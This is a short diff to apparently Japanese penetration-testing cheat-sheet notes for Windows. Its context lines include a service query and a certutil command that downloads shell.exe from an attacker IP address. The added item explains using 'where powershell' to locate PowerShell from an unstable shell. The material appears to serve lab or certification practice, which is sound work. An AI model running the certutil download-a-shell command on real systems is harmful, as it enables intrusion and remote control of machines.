@@ -76,3 +76,8 @@ sc qc apphostsvc
 ```
 certutil -urlcache -f http://192.168.45.216:80/shell.exe shell.exe
 ```
+
+14. powershellへのアクセスが無いみたいな安定しないシェルでpowershell直接ぶったたくときとかに使える。
+```
+where powershell
+```
